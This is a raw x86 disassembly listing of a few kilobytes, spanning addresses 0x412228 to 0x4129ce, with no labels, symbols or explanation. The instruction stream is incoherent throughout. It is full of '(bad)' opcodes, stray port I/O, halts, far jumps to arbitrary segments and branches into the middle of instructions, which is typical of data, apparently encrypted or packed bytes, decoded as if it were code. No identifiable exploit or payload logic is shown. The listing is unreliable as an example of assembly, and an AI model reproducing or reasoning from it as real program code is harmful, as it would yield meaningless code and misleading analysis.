  412228:	mov    dh,0x4b
  41222a:	aad    0x20
  41222c:	mov    eax,gs:0x5d27eacd
  412232:	retf   0x9559
  412235:	pop    ds
  412236:	sub    cl,BYTE PTR [esi]
  412238:	ins    DWORD PTR es:[edi],dx
  412239:	and    DWORD PTR [ecx],edx
  41223b:	(bad)  
  41223c:	hlt    
  41223d:	inc    esi
  41223e:	aad    0x41
  412240:	xor    BYTE PTR [edx+0x28514d93],0x3
  412247:	jne    0x4121f8
  412249:	adc    eax,DWORD PTR [eax-0x36]
  41224c:	and    BYTE PTR [esi],ch
  41224e:	ja     0x412229
  412250:	jno    0x412269
  412252:	push   edx
  412253:	gs xchg dh,dl
  412256:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412257:	mov    ecx,0x1ce56c1f
  41225c:	jno    0x41223f
  41225e:	mov    edx,0xa68448d
  412263:	pushf  
  412264:	jno    0x41227b
  412266:	pusha  
  412267:	mov    dh,BYTE PTR [edi+0x6a]
  41226a:	xchg   edx,eax
  41226b:	jmp    0x4122e2
  41226d:	pop    ds
  41226e:	mov    al,ds:0xad78a4c2
  412273:	jbe    0x41229d
  412275:	dec    ebp
  412276:	repz (bad) 
  412278:	(bad)  [ebx-0x2b]
  41227b:	shr    DWORD PTR [esi],1
  41227d:	out    dx,eax
  41227e:	jb     0x4122f4
  412280:	jmp    0x720838e0
  412285:	xor    al,0xe8
  412287:	pop    edi
  412288:	cmp    ecx,DWORD PTR [edx]
  41228a:	fstp   TBYTE PTR [esi-0x12]
  41228d:	push   ecx
  41228e:	aad    0x44
  412290:	icebp  
  412291:	pop    ebp
  412292:	mov    ch,0x3b
  412294:	pop    ebp
  412295:	dec    ebx
  412296:	mov    cl,0xeb
  412298:	stc    
  412299:	cs dec esp
  41229b:	mov    eax,0x5ce9d305
  4122a0:	jno    0x4122af
  4122a2:	in     al,0x89
  4122a4:	cld    
  4122a5:	enter  0x30bd,0x71
  4122a9:	xchg   ecx,eax
  4122aa:	retf   0x2ef4
  4122ad:	push   ecx
  4122ae:	(bad)  
  4122af:	mov    ebp,0xf8794796
  4122b4:	aaa    
  4122b5:	and    bh,bl
  4122b7:	les    edi,FWORD PTR [esi]
  4122b9:	inc    eax
  4122ba:	fisttp QWORD PTR [eax]
  4122bc:	shl    esp,1
  4122be:	aad    0x1c
  4122c0:	or     al,0xdc
  4122c2:	imul   ch
  4122c4:	cwde   
  4122c5:	stos   DWORD PTR es:[edi],eax
  4122c6:	mov    DWORD PTR [ebp-0x3b],esi
  4122c9:	or     al,0x85
  4122cb:	out    0x8a,al
  4122cd:	jmp    0x26b4ae80
  4122d2:	mov    ecx,0xb22b7ec2
  4122d7:	push   ebp
  4122d8:	mov    edi,0x5f76b347
  4122dd:	sbb    eax,0x848df4c0
  4122e2:	dec    ecx
  4122e3:	inc    ecx
  4122e4:	xchg   BYTE PTR [esi],ch
  4122e6:	push   edx
  4122e7:	shl    BYTE PTR [ecx+0x35],1
  4122ea:	pop    ebp
  4122eb:	rcl    DWORD PTR [esi],0x1c
  4122ee:	mov    ecx,0xdf20596e
  4122f3:	jge    0x412339
  4122f5:	(bad)  
  4122f6:	sub    eax,0xd5741e02
  4122fb:	mov    BYTE PTR [edi],ch
  4122fd:	inc    ecx
  4122fe:	repz jp 0x4122b1
  412301:	inc    esi
  412302:	push   ds
  412303:	out    dx,eax
  412304:	mov    bh,0x22
  412306:	les    ebp,FWORD PTR [edx]
  412308:	push   edx
  412309:	pop    es
  41230a:	sbb    BYTE PTR [ebp+0x49],bh
  41230d:	fs mov edi,0xdf806db
  412313:	ja     0x4122fb
  412315:	call   0x6ef94e1c
  41231a:	xor    eax,0xd5bc0c55
  41231f:	mov    ch,0x5c
  412321:	out    0x26,al
  412323:	fwait
  412324:	inc    ebx
  412325:	ins    DWORD PTR es:[edi],dx
  412326:	or     al,0x75
  412328:	adc    eax,ebx
  41232a:	and    BYTE PTR [esi-0x2c2fb1f0],ah
  412330:	jno    0x41232a
  412332:	dec    esp
  412333:	push   ebx
  412334:	jae    0x4122ce
  412336:	jl     0x412352
  412338:	push   es
  412339:	and    BYTE PTR ds:0x9a6e858e,dh
  41233f:	punpcklwd mm3,DWORD PTR [edx-0x2b]
  412343:	out    dx,al
  412344:	mov    eax,0x472c0e1a
  412349:	xchg   ebx,eax
  41234a:	mov    ebx,0xa8299b75
  41234f:	mov    ecx,0xdc2db890
  412354:	pusha  
  412355:	add    al,0x77
  412357:	jecxz  0x4123ca
  412359:	jnp    0x412366
  41235b:	xor    ebp,DWORD PTR [ebp+0x25]
  41235e:	pusha  
  41235f:	lea    eax,[edi+0x20]
  412362:	jecxz  0x41232b
  412364:	(bad)  
  412365:	in     eax,0xc7
  412367:	dec    ebp
  412368:	jp     0x412330
  41236a:	hlt    
  41236b:	retf   
  41236c:	(bad)  
  41236e:	adc    eax,0x1e5fbd77
  412373:	xchg   edi,eax
  412374:	ins    BYTE PTR es:[edi],dx
  412375:	pop    esp
  412376:	jbe    0x412300
  412378:	ins    BYTE PTR es:[edi],dx
  412379:	and    BYTE PTR [ebx+0x18bb87b4],bh
  41237f:	sub    al,0xf7
  412381:	mov    ds:0xfa637fd5,al
  412386:	push   ebx
  412387:	pop    ebp
  412388:	inc    esp
  412389:	nop
  41238a:	adc    DWORD PTR [ebp-0x2a],esi
  41238d:	popa   
  41238e:	fs test al,0x3c
  412391:	lods   eax,DWORD PTR ds:[esi]
  412392:	cwde   
  412393:	fidivr WORD PTR [ebp+0x4e74fdfb]
  412399:	data16 aaa 
  41239b:	aam    0xf1
  41239d:	rcl    BYTE PTR [esi-0x216bab5d],cl
  4123a3:	jnp    0x412414
  4123a5:	imul   esi,DWORD PTR [esi+0x63],0xef5aaf1
  4123ac:	mov    dh,0x57
  4123ae:	aad    0x16
  4123b0:	dec    ebx
  4123b1:	stc    
  4123b2:	cmp    ch,BYTE PTR [ebp+0x6d]
  4123b5:	(bad)  
  4123b7:	je     0x4123ad
  4123b9:	repz mov ebx,0xe243b09b
  4123bf:	cld    
  4123c0:	jno    0x412440
  4123c2:	xchg   ebp,eax
  4123c3:	inc    eax
  4123c4:	stos   BYTE PTR es:[edi],al
  4123c5:	ret    0xc2fe
  4123c8:	or     esp,DWORD PTR [eax]
  4123ca:	adc    eax,0xadcc7a0c
  4123cf:	test   eax,0xf0d809fb
  4123d4:	lahf   
  4123d5:	lock cmp al,0x92
  4123d8:	ficomp WORD PTR [edi-0x13]
  4123db:	fistp  QWORD PTR [ebx-0x6660a5c2]
  4123e1:	and    ebp,edi
  4123e3:	xchg   BYTE PTR [ecx-0x2b774b41],al
  4123e9:	jl     0x412432
  4123eb:	(bad)  [ecx]
  4123ed:	mov    al,ds:0x1ff7f158
  4123f2:	dec    esp
  4123f3:	jae    0x412430
  4123f5:	jne    0x41237e
  4123f7:	xor    BYTE PTR [edi],ch
  4123f9:	push   ebx
  4123fa:	aad    0x61
  4123fc:	xchg   esi,eax
  4123fd:	add    eax,0x546975f
  412402:	and    eax,0xc08fcd75
  412407:	sub    dl,ch
  412409:	sbb    DWORD PTR [ecx-0x76a88ec2],edx
  41240f:	or     al,0x26
  412411:	xor    ch,BYTE PTR [eax+0x3b1fcc46]
  412417:	cld    
  412418:	je     0x4123f1
  41241a:	adc    dl,BYTE PTR [esp+edi*2-0x7f]
  41241e:	aad    0xe3
  412420:	scas   eax,DWORD PTR es:[edi]
  412421:	in     eax,0x1f
  412423:	jg     0x41248c
  412425:	neg    BYTE PTR [ecx-0x11]
  412428:	xchg   esp,eax
  412429:	pop    ds
  41242a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41242b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41242c:	test   dl,al
  41242e:	mov    bl,0x8a
  412430:	outs   dx,BYTE PTR ds:[esi]
  412431:	mov    ss,ebp
  412433:	(bad)  
  412434:	shl    BYTE PTR [ebx],cl
  412436:	mov    esp,0x67e5b011
  41243b:	jne    0x412486
  41243d:	jp     0x41249b
  41243f:	jae    0x41243a
  412441:	jbe    0x412403
  412443:	shl    BYTE PTR [ecx+0x3b],0x12
  412447:	mov    edi,0xe9d00f39
  41244c:	test   al,0x22
  41244e:	loope  0x412430
  412450:	ja     0x412411
  412452:	pop    edx
  412453:	mov    eax,ds:0xf574bf0c
  412458:	jae    0x412492
  41245a:	shr    BYTE PTR [edx-0x80],1
  41245d:	pushf  
  41245e:	and    ah,BYTE PTR [edi]
  412460:	pushf  
  412461:	jg     0x41245d
  412463:	dec    esp
  412464:	pusha  
  412465:	dec    eax
  412466:	jns    0x4124df
  412468:	inc    ebx
  412469:	lds    edx,FWORD PTR [edx+0x15b3ddac]
  41246f:	arpl   bx,si
  412471:	inc    bh
  412473:	bound  esi,QWORD PTR [ecx-0x77]
  412476:	mov    ch,BYTE PTR [eax+0x491d4d98]
  41247c:	lods   eax,DWORD PTR ds:[esi]
  41247d:	or     eax,0x6fe375ab
  412482:	nop
  412483:	xchg   ecx,eax
  412484:	xchg   esp,eax
  412485:	xor    esp,DWORD PTR [ebx-0x2e]
  412488:	jno    0x41243a
  41248a:	jb     0x4124b8
  41248c:	dec    ebp
  41248d:	sbb    ebp,DWORD PTR [edi-0x44]
  412490:	push   0x20
  412492:	mov    edi,DWORD PTR [ecx+0x75db39f5]
  412498:	nop
  412499:	fst    st(5)
  41249b:	cs and eax,0xf52f62a
  4124a1:	inc    ebp
  4124a2:	adc    dh,BYTE PTR [ebp-0x7]
  4124a5:	jno    0x412503
  4124a7:	xor    al,0x4
  4124a9:	repz fs pop ecx
  4124ac:	pop    ebx
  4124ad:	in     al,dx
  4124ae:	aad    0xf8
  4124b0:	ins    BYTE PTR es:[edi],dx
  4124b1:	data16 jge 0x41251d
  4124b4:	sti    
  4124b5:	ja     0x4124f1
  4124b7:	jne    0x4124cb
  4124b9:	outs   dx,DWORD PTR ds:[esi]
  4124ba:	cs mov dh,0x2d
  4124bd:	or     DWORD PTR [esi],ebx
  4124bf:	inc    eax
  4124c0:	je     0x4124ab
  4124c2:	(bad)  
  4124c3:	outs   dx,DWORD PTR ds:[esi]
  4124c4:	adc    BYTE PTR [ebp-0x4d],bh
  4124c7:	cmc    
  4124c8:	pop    esp
  4124c9:	adc    DWORD PTR [edx],ebp
  4124cb:	jl     0x4124c5
  4124cd:	rcl    BYTE PTR [edx-0x57],1
  4124d0:	stos   DWORD PTR es:[edi],eax
  4124d1:	das    
  4124d2:	cmp    eax,0xd591ffe9
  4124d7:	jbe    0x412492
  4124d9:	nop
  4124da:	repnz fcmovnbe st,st(2)
  4124dd:	loope  0x412524
  4124df:	jne    0x412534
  4124e1:	jp     0x41246d
  4124e3:	pop    esp
  4124e4:	xor    eax,0x719c15ad
  4124e9:	in     eax,0xda
  4124eb:	sbb    ebx,esp
  4124ed:	lock pushf 
  4124ef:	cwde   
  4124f0:	push   0x2e34bd20
  4124f5:	imul   edx,DWORD PTR [eax],0xdec6ca8d
  4124fb:	out    dx,al
  4124fc:	test   BYTE PTR [edx+0x70],bh
  4124ff:	jne    0x4124c6
  412501:	adc    BYTE PTR ds:0xe1fe97a,0xad
  412508:	push   edx
  412509:	ret    0x6d6e
  41250c:	push   edi
  41250d:	iret   
  41250e:	aad    0xbd
  412510:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412511:	pop    gs
  412513:	imul   ebx,DWORD PTR [edx+0xe],0x6b
  412517:	jne    0x4124e0
  412519:	push   esp
  41251a:	mov    dl,0x1e
  41251c:	fld    QWORD PTR [ebp-0x18]
  41251f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412520:	jb     0x412579
  412522:	enter  0xde8f,0x13
  412526:	pop    es
  412527:	adc    dh,BYTE PTR [edx]
  412529:	xor    bh,BYTE PTR [ecx+0x3c3bd326]
  41252f:	dec    ecx
  412530:	mov    ch,0xdf
  412532:	dec    ebx
  412533:	shr    BYTE PTR [esi],1
  412535:	sub    DWORD PTR [esi-0x17],ebx
  412538:	jno    0x41258e
  41253a:	imul   eax,ebx,0x9e0ef15a
  412540:	mov    ebx,DWORD PTR [edi]
  412542:	inc    ebp
  412543:	add    eax,0x791d380b
  412548:	out    0x56,eax
  41254a:	aad    0xaa
  41254c:	mov    eax,ds:0xa95e0862
  412551:	hlt    
  412552:	pop    ss
  412553:	ja     0x4125b9
  412555:	jb     0x4125d6
  412557:	ror    DWORD PTR [eax],0x33
  41255a:	mov    ch,0xbf
  41255c:	jns    0x4125d3
  41255e:	in     al,0x99
  412560:	dec    eax
  412561:	dec    eax
  412562:	inc    edx
  412563:	cmc    
  412564:	dec    esp
  412565:	clc    
  412566:	fwait
  412567:	mov    eax,0x15723b9f
  41256c:	push   0xffffffe0
  41256e:	mov    edi,0x1100f23
  412573:	sahf   
  412574:	jno    0x4125c4
  412576:	and    al,0x2f
  412578:	sar    DWORD PTR [edi+0x1b],cl
  41257b:	mov    ah,bl
  41257d:	and    bh,ch
  41257f:	retf   
  412580:	and    eax,0x216dc7dd
  412585:	enter  0x5fb,0x71
  412589:	sbb    al,0xbd
  41258b:	cmp    ebp,DWORD PTR [edx-0x51]
  41258e:	lds    ecx,FWORD PTR cs:[eax-0x1fcea7e1]
  412595:	cvtpi2ps xmm5,QWORD PTR [edi]
  412598:	push   esp
  412599:	(bad)  
  41259a:	aad    0xdb
  41259c:	xor    BYTE PTR [edx-0x13c12725],bh
  4125a2:	dec    ecx
  4125a3:	mov    bl,0x9e
  4125a5:	cmp    ch,dl
  4125a7:	in     eax,0xf8
  4125a9:	sub    ebx,edi
  4125ab:	jbe    0x41253f
  4125ad:	inc    edx
  4125ae:	aad    0xbb
  4125b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125b1:	retf   
  4125b2:	cmp    edx,DWORD PTR [edi]
  4125b4:	in     eax,0xf0
  4125b6:	into   
  4125b7:	jmp    0x6c244923
  4125bc:	xchg   ecx,eax
  4125bd:	push   0x5
  4125bf:	jmp    0xc9ab:0x72e2de49
  4125c6:	push   cs
  4125c7:	cmc    
  4125c8:	stos   DWORD PTR es:[edi],eax
  4125c9:	ja     0x4125aa
  4125cb:	pushf  
  4125cc:	push   0xffffffdc
  4125ce:	mov    WORD PTR [ebp+0x32],?
  4125d1:	div    BYTE PTR [ebp+edx*8-0x4d]
  4125d5:	jae    0x412574
  4125d7:	repz jno 0x4125b7
  4125da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125db:	psllw  mm6,QWORD PTR ds:0x1f79f010
  4125e2:	lods   al,BYTE PTR ds:[esi]
  4125e3:	into   
  4125e4:	xor    al,0x49
  4125e6:	sahf   
  4125e7:	xchg   ecx,eax
  4125e8:	xchg   esi,eax
  4125e9:	cmc    
  4125ea:	push   ecx
  4125eb:	es jno 0x412580
  4125ee:	lock sub al,0x56
  4125f1:	push   es
  4125f2:	jge    0x4125ed
  4125f4:	dec    edi
  4125f5:	and    BYTE PTR [ebp+0x28],bl
  4125f8:	cwde   
  4125f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125fa:	push   ebp
  4125fb:	test   DWORD PTR [edi],0x4dffd67e
  412601:	pop    ecx
  412602:	adc    BYTE PTR [eax],bl
  412604:	(bad)  
  412605:	mov    ah,0xa1
  412607:	adc    BYTE PTR [edx],0x20
  41260a:	retf   
  41260b:	in     al,0x57
  41260d:	sbb    eax,0xe09fd367
  412612:	repnz sub ch,cl
  412615:	xchg   ecx,eax
  412616:	adc    eax,0xbe2e1d1b
  41261b:	ficomp DWORD PTR [ebp+0x1c]
  41261e:	xchg   ebx,eax
  41261f:	jp     0x4125f3
  412621:	jbe    0x412677
  412623:	mov    esp,edx
  412625:	lahf   
  412626:	mov    cl,0x52
  412628:	adc    eax,0x71dd5333
  41262d:	ss pop es
  41262f:	xchg   ebp,eax
  412630:	cmp    ebp,ebp
  412632:	enter  0x3cf4,0x46
  412636:	xchg   ecx,ecx
  412638:	mov    eax,ds:0x89ded85e
  41263d:	inc    esi
  41263e:	mov    edi,gs
  412640:	jb     0x41264d
  412642:	sahf   
  412643:	push   esp
  412644:	sub    dl,BYTE PTR [esi+eax*1-0x1a]
  412648:	push   ebp
  412649:	jmp    0x4a3fd8ae
  41264e:	push   ebp
  41264f:	mov    ds:0x16a71f2,eax
  412654:	dec    esp
  412655:	add    dh,dl
  412657:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412658:	adc    al,BYTE PTR [edi+0x2d]
  41265b:	cmp    al,0x8b
  41265d:	mov    ebx,0xdfe475c2
  412662:	sbb    DWORD PTR [esi-0x4a],0x71047cad
  412669:	sbb    DWORD PTR [edi],0x300c02c5
  41266f:	mov    bl,0x3a
  412671:	daa    
  412672:	mov    bl,BYTE PTR es:[edx+0x78d3adf5]
  412679:	jmp    0x412608
  41267b:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41267d:	mov    ebx,0x6d665d6d
  412682:	aad    0x54
  412684:	xchg   edx,eax
  412685:	mov    ds:0x983443b0,al
  41268a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41268b:	jne    0x41262d
  41268d:	arpl   WORD PTR [edx-0x533335eb],cx
  412693:	imul   esi,DWORD PTR [ecx-0x52],0x15
  412697:	iret   
  412698:	lock inc esi
  41269a:	fisttp DWORD PTR [edi+0x5c15b6fb]
  4126a0:	sub    cl,bl
  4126a2:	adc    al,0xe5
  4126a4:	inc    edx
  4126a5:	and    BYTE PTR [eax+0x1d],dl
  4126a8:	dec    ebp
  4126a9:	and    DWORD PTR [esi+edi*4+0x37],esp
  4126ad:	rcl    BYTE PTR [edi-0x66d5b88b],1
  4126b3:	xor    al,0x87
  4126b5:	outs   dx,DWORD PTR ds:[esi]
  4126b6:	call   0xa5f6:0x4c11711f
  4126bd:	stos   DWORD PTR es:[edi],eax
  4126be:	xor    DWORD PTR [ecx],ecx
  4126c0:	add    ah,BYTE PTR [eax]
  4126c2:	addr16 mov bl,0xe1
  4126c5:	out    dx,eax
  4126c6:	cmp    al,BYTE PTR [esi+edi*8-0x35]
  4126ca:	loope  0x412698
  4126cc:	jb     0x4126e2
  4126ce:	das    
  4126cf:	mov    bl,0x51
  4126d1:	xchg   ecx,eax
  4126d2:	push   ebx
  4126d3:	jne    0x4126f5
  4126d5:	lahf   
  4126d6:	mov    ebx,0x5bcc231
  4126db:	(bad)  [ecx+0x24]
  4126de:	addr16 xchg edi,eax
  4126e0:	(bad)  
  4126e1:	mov    edi,0x26a368f3
  4126e6:	enter  0x62ab,0x3f
  4126ea:	rcl    BYTE PTR [ebp+0x65a47914],cl
  4126f0:	jno    0x4126bf
  4126f2:	rcr    DWORD PTR [ecx],1
  4126f4:	push   eax
  4126f5:	cmp    esi,DWORD PTR [ecx]
  4126f7:	push   edx
  4126f8:	sub    DWORD PTR [eax],esp
  4126fa:	pop    esi
  4126fb:	pusha  
  4126fc:	sbb    cl,ch
  4126fe:	mov    ?,WORD PTR [esi+0x41]
  412701:	mov    ebp,0xaad2afd5
  412706:	fdiv   DWORD PTR [ebx+0x17]
  412709:	mov    DWORD PTR [edi-0x6c],ebp
  41270c:	test   DWORD PTR [esi+0xf],ebx
  41270f:	jae    0x41273f
  412711:	push   0x37c72ad5
  412716:	(bad)  
  412717:	int    0x49
  412719:	(bad)  
  41271a:	aad    0x48
  41271c:	adc    ch,cl
  41271e:	imul   ebx,DWORD PTR [eax+0x75b44f23],0xa
  412725:	and    al,0x93
  412727:	sub    ecx,edi
  412729:	cwde   
  41272a:	fwait
  41272b:	(bad)  
  41272d:	inc    ecx
  41272e:	add    eax,ecx
  412730:	leave  
  412731:	out    dx,eax
  412732:	test   eax,0xe39be28a
  412737:	jne    0x412730
  412739:	aad    0xc1
  41273b:	loop   0x4127a1
  41273d:	jmp    0x6bd5:0xcd879523
  412744:	adc    BYTE PTR [esi+0xa0d50da],dh
  41274a:	jle    0x4126fd
  41274c:	fwait
  41274d:	jmp    0x412700
  41274f:	sbb    ah,dh
  412751:	cmp    al,0x7a
  412753:	jo     0x412797
  412755:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412756:	call   0x18d45893
  41275b:	cmp    eax,0x74747031
  412760:	jno    0x41274b
  412762:	outs   dx,DWORD PTR ds:[esi]
  412763:	push   ebx
  412764:	adc    BYTE PTR [ecx+0x206ec885],0xb7
  41276b:	mov    DWORD PTR [esi-0x51],eax
  41276e:	dec    ebx
  41276f:	adc    cl,BYTE PTR [eax]
  412771:	dec    edx
  412772:	aad    0xc1
  412774:	xchg   ebx,eax
  412775:	xor    BYTE PTR [edx+ebx*4+0x7507fb27],dl
  41277c:	cwde   
  41277d:	push   es
  41277e:	sub    esp,DWORD PTR [edi+edi*8-0x25]
  412782:	xor    eax,0xb79d71f0
  412787:	ss cmp dh,ah
  41278a:	loope  0x4127e1
  41278c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41278d:	pop    ds
  41278e:	mov    al,0xe6
  412790:	pop    eax
  412791:	jae    0x412722
  412793:	jp     0x4127a9
  412795:	mov    dh,0xd5
  412797:	nop
  412798:	and    al,0x7e
  41279a:	sub    al,0x1e
  41279c:	pop    esi
  41279d:	xchg   edi,eax
  41279e:	adc    dh,BYTE PTR [ebp+0x56]
  4127a1:	clc    
  4127a2:	adc    BYTE PTR ds:0x29492efa,ah
  4127a8:	pop    ebx
  4127a9:	std    
  4127aa:	aad    0xb5
  4127ac:	clc    
  4127ad:	arpl   cx,di
  4127af:	bound  ecx,QWORD PTR [esi]
  4127b1:	add    DWORD PTR gs:[ebp+edi*2-0x5fd56ba8],0xf
  4127ba:	div    BYTE PTR [ecx-0x387962fc]
  4127c0:	jno    0x412824
  4127c2:	mov    eax,ds:0xecc7960b
  4127c7:	aam    0x20
  4127c9:	and    ah,al
  4127cb:	pop    DWORD PTR [ebp-0x17]
  4127ce:	stc    
  4127cf:	call   0xf552696e
  4127d4:	dec    esp
  4127d5:	and    ch,al
  4127d7:	jae    0x4127d1
  4127d9:	push   es
  4127da:	mov    dh,0xc
  4127dc:	ficomp WORD PTR [edi]
  4127de:	outs   dx,DWORD PTR ds:[esi]
  4127df:	jle    0x4127e1
  4127e1:	mov    ebp,0x5a743e15
  4127e6:	(bad)  
  4127e7:	pop    edx
  4127e8:	inc    edx
  4127e9:	mov    ch,0xbf
  4127eb:	xchg   al,ah
  4127ed:	mov    esi,0xf84155d4
  4127f2:	fbstp  TBYTE PTR [esi+esi*8+0x1]
  4127f6:	loop   0x4127a4
  4127f8:	ins    BYTE PTR es:[edi],dx
  4127f9:	pop    ebp
  4127fa:	ficom  WORD PTR [edi]
  4127fc:	jno    0x41284f
  4127fe:	arpl   WORD PTR [edx-0x5f44d191],di
  412804:	test   BYTE PTR [esi],ah
  412806:	or     DWORD PTR [ebx],edi
  412808:	add    eax,0x5f03960c
  41280d:	not    BYTE PTR [ebp-0x3f]
  412810:	jl     0x41288c
  412812:	mov    ch,0x4
  412814:	nop
  412815:	lahf   
  412816:	or     al,0x9e
  412818:	xor    DWORD PTR ds:0x1bec0ae5,ebp
  41281e:	fidiv  DWORD PTR [ebx+eax*1+0x5f]
  412822:	and    dl,bh
  412824:	aaa    
  412825:	lds    edi,FWORD PTR [esi+ecx*4+0x37437e74]
  41282c:	or     dl,BYTE PTR [ebx-0x614dc2a2]
  412832:	sbb    BYTE PTR [ebp+0x1a],dh
  412835:	repz cmc 
  412837:	sub    DWORD PTR [eax+0x5a],0xa9ad4077
  41283e:	lahf   
  41283f:	jne    0x412853
  412841:	or     BYTE PTR [esi-0x71],bl
  412844:	inc    ecx
  412845:	xor    eax,0x29c47572
  41284a:	repnz imul ebx,DWORD PTR [esi+0x5],0xffffffa8
  41284f:	jae    0x4128c7
  412851:	mov    dl,0x4c
  412853:	push   0x45
  412855:	in     eax,0x5c
  412857:	test   DWORD PTR [ecx-0x280e0a8b],esi
  41285d:	pop    ds
  41285e:	mov    al,ds:0xe974d142
  412863:	push   es
  412864:	int3   
  412865:	outs   dx,DWORD PTR ds:[esi]
  412866:	fadd   DWORD PTR [edi+0x24c6d6fe]
  41286c:	pop    edx
  41286d:	clc    
  41286e:	sbb    ch,BYTE PTR [ebp+ebx*2+0x50a6d820]
  412875:	outs   dx,DWORD PTR ds:[esi]
  412876:	pusha  
  412877:	push   esi
  412878:	mov    cl,BYTE PTR [edx]
  41287a:	(bad)  
  41287b:	rcl    BYTE PTR [edx],0x2b
  41287e:	cld    
  41287f:	bswap  ebx
  412881:	xchg   BYTE PTR [esi*2-0x4ea3b9f2],al
  412888:	outs   dx,BYTE PTR ds:[esi]
  412889:	(bad)  
  41288a:	mov    al,ds:0xc8697479
  41288f:	push   esi
  412890:	in     eax,0xd6
  412892:	fcom   DWORD PTR [ebp+0x1a]
  412895:	dec    edi
  412896:	mov    ch,0xde
  412898:	add    ah,BYTE PTR [eax]
  41289a:	sub    al,0xba
  41289c:	out    dx,al
  41289d:	stos   DWORD PTR es:[edi],eax
  41289e:	jno    0x412913
  4128a0:	or     bl,BYTE PTR [edi-0x2b]
  4128a3:	add    bh,BYTE PTR [ebx]
  4128a5:	push   0x85779921
  4128aa:	dec    esp
  4128ab:	jbe    0x4128a8
  4128ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128ae:	mov    bl,0xd0
  4128b0:	mov    esi,0xd2390a11
  4128b5:	jmp    0x4128b8
  4128b7:	aam    0x45
  4128b9:	repz aad 0x6
  4128bc:	push   ss
  4128bd:	inc    esi
  4128be:	dec    cl
  4128c0:	push   edi
  4128c1:	push   ss
  4128c2:	call   0x803c7b3b
  4128c7:	add    al,BYTE PTR [edx]
  4128c9:	lea    eax,[esi-0x61]
  4128cc:	jno    0x412909
  4128ce:	add    edi,esi
  4128d0:	test   eax,0xf092de35
  4128d5:	pop    ds
  4128d6:	std    
  4128d7:	(bad)
  4128da:	cmc    
  4128db:	pop    eax
  4128dc:	scas   al,BYTE PTR es:[edi]
  4128dd:	jne    0x412954
  4128df:	outs   dx,BYTE PTR ds:[esi]
  4128e0:	mov    DWORD PTR [ebp-0x1c],edx
  4128e3:	or     cl,ah
  4128e5:	mov    ebx,esp
  4128e7:	hlt    
  4128e8:	mov    bh,0x82
  4128ea:	ret    0x1934
  4128ed:	and    dh,ah
  4128ef:	xor    ecx,0x3a
  4128f2:	neg    DWORD PTR [edx]
  4128f4:	ret    
  4128f5:	jnp    0x4128cc
  4128f7:	pop    eax
  4128f8:	addr16 xor al,0xd9
  4128fb:	or     al,0x4b
  4128fd:	loop   0x412948
  4128ff:	jne    0x4128f4
  412901:	xchg   esp,eax
  412902:	sbb    dh,ch
  412904:	sar    BYTE PTR [ecx+0x557f3122],0xdb
  41290b:	pop    edx
  41290c:	sbb    bl,BYTE PTR [ebp+0x33]
  41290f:	sbb    esi,DWORD PTR [ecx+0x79]
  412912:	mov    DWORD PTR [ebp+eiz*4-0x206eee79],ebp
  412919:	out    dx,al
  41291a:	ins    BYTE PTR es:[edi],dx
  41291b:	clc    
  41291c:	(bad)  
  41291d:	rcr    BYTE PTR [ebx-0x1ee79dbe],cl
  412923:	dec    esp
  412924:	dec    edi
  412925:	sti    
  412926:	mov    ecx,0x80cf722e
  41292b:	loope  0x41295f
  41292d:	mov    ch,0x7a
  41292f:	lock shr DWORD PTR [edx],1
  412932:	aaa    
  412933:	jne    0x412973
  412935:	or     BYTE PTR [edx],dh
  412937:	jl     0x4128d0
  412939:	adc    bh,dl
  41293b:	mov    BYTE PTR [ecx+0x17],dh
  41293e:	adc    eax,0x83022fb
  412943:	in     al,0x64
  412945:	sbb    dh,BYTE PTR [ecx]
  412947:	mov    cl,0x48
  412949:	(bad)  
  41294a:	dec    ecx
  41294b:	jne    0x4128ed
  41294d:	mov    ch,0xbe
  41294f:	cli    
  412950:	push   ss
  412951:	mov    eax,0x19ed45e3
  412956:	(bad)  
  412957:	rcl    BYTE PTR [ebx+0x619c9e5],1
  41295d:	sub    ch,BYTE PTR [edx+0x1bd1a17a]
  412963:	ins    BYTE PTR es:[edi],dx
  412964:	mov    dl,0xdf
  412966:	pop    ebp
  412967:	pushf  
  412968:	mov    edx,DWORD PTR [esp+edx*2]
  41296b:	div    BYTE PTR [ecx-0x1]
  41296e:	loope  0x4129aa
  412970:	xor    al,0x9a
  412972:	push   DWORD PTR [eax-0x25]
  412975:	jnp    0x412993
  412977:	aam    0x7f
  412979:	test   BYTE PTR [ecx-0x3daaae2e],dh
  41297f:	sub    ch,BYTE PTR [eax]
  412981:	inc    ecx
  412982:	aad    0xa4
  412984:	mov    esi,0x5b5ba4eb
  412989:	sbb    eax,DWORD PTR [esi*2+0xc712be7]
  412990:	ret    
  412991:	mov    fs,edx
  412993:	adc    bh,BYTE PTR [eax+0x6b]
  412996:	dec    edi
  412997:	push   esi
  412998:	pop    edx
  412999:	pop    edi
  41299a:	jmp    0xa4a7:0x87fa3166
  4129a1:	ja     0x4129d9
  4129a3:	popf   
  4129a4:	jno    0x412984
  4129a6:	pop    ds
  4129a7:	pop    ebx
  4129a8:	mov    edx,0x71e2c9c5
  4129ad:	push   ebp
  4129ae:	shl    BYTE PTR [ebp-0x53],0x97
  4129b2:	sbb    cl,BYTE PTR [edx]
  4129b4:	bound  esp,QWORD PTR [eax]
  4129b6:	sub    ebx,esi
  4129b8:	fucomi st,st(2)
  4129ba:	inc    edi
  4129bb:	test   eax,0xf665e2eb
  4129c0:	imul   esi,esp,0xffffffd6
  4129c3:	sbb    al,0x48
  4129c5:	xchg   edi,eax
  4129c6:	dec    ebp
  4129c7:	jl     0x4129a0
  4129c9:	mov    esp,0x2ee171c9
  4129ce:	xlat   BYTE PTR ds:[ebx]
